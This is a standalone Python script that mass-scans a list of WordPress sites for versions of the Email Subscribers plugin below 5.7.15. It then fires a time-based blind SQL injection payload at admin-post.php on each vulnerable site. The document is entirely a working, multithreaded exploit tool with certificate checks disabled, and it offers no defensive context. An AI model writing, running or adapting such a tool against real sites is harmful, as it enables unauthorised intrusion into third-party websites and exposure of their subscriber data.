import threading
import requests, re, time, sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def Exploit(url):
    headers = {
    "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = {
    "page": "es_subscribers",
    "is_ajax": "1",
    "action": "_sent",
    "advanced_filter[conditions][0][0][field]": "status=99924)))union(select(sleep(4)))--+",
    "advanced_filter[conditions][0][0][operator]": "==",
    "advanced_filter[conditions][0][0][value]": "1111"
    }
    try:
        start_time = time.time()
        req = requests.post(url+"/wp-admin/admin-post.php", headers=headers, data=payload)
        end_time = time.time()
        elapsed_time = end_time - start_time

        if elapsed_time >= 4:
            print(f"{url} Exploited Sucessfully")
        else:
            pass

    except Exception as e:
        pass


# Function to make a GET request
def fetch_url(url):
    try:
        pattern = r'Stable tag:\s*(\d+\.\d+\.\d+)'
        response = requests.get(url+"/wp-content/plugins/email-subscribers/readme.txt", timeout=1, verify=False).text
        find = re.findall(pattern,response)
        for match in find:
            # Split the version into major, minor, and patch
            major, minor, patch = map(int, match.split('.'))
            
            # Check if version is lower than 5.7.15
            if (major, minor, patch) < (5, 7, 15):
                print(f"{url} vulnerable version found")
                Exploit(url)
        # print(f"URL: {url}, Status Code: {find}", flush=True)
    except requests.exceptions.RequestException as e:
        print(f"Error fetching {url}: {e}", flush=True)

# List of URLs to fetch (duplicated to simulate more URLs)
def read_urls_from_file(filename):
    with open(filename, 'r') as file:
        # Strip newlines and only keep non-empty lines
        urls = [line.strip() for line in file if line.strip()]
    return urls

if len(sys.argv) < 2:
        print("Usage: python script.py <filename>")
        sys.exit(1)

        
urls = read_urls_from_file(sys.argv[1])

# Function to manage threading with a limit of 20 threads
def thread_manager(urls, max_threads=20):
    threads = []
    
    for i, url in enumerate(urls):
        thread = threading.Thread(target=fetch_url, args=(url,))
        threads.append(thread)
        thread.start()

        # Limit to max_threads, wait for the first batch to finish
        if len(threads) == max_threads:
            for t in threads:
                t.join()  # Wait for all threads to complete
            threads = []  # Clear the list for the next batch

    # Join any remaining threads
    for t in threads:
        t.join()

# Run the thread manager
thread_manager(urls, max_threads=20)


print("All requests are complete.")
